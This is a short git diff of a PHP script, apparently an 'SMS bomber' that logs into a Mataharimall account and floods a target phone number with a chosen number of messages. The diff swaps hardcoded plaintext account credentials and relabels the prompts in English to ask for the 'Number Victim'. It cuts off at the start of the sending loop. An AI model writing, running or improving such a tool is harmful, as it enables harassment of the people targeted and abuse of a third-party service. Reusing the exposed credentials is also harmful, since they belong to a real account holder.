@@ -9,15 +9,15 @@ include 'bommthrml.php';
 
 $init = new Bom();
 // Konfigurasi Akun Mataharimall
-$init->email = "zumupolij@c1oramn.com";
-$init->pass = "Hilih kintil";
+$init->email = "otosaka404@gmail.com";
+$init->pass = "lingga123";
 $init->Login($init->email,$init->pass);
 
 //Eksekusi Sms Boomber
-echo "Nomor Target (pakai 62): ";
+echo "</> Number Victim (use 62) : ";
 $a = trim(fgets(STDIN));
 $init->no = "$a";
-echo "Jumlah Pesan : ";
+echo "</> Number Of Messages : ";
 $b = trim(fgets(STDIN));
 $loop = "$b";
 for ($i=0; $i < $loop; $i++) { 
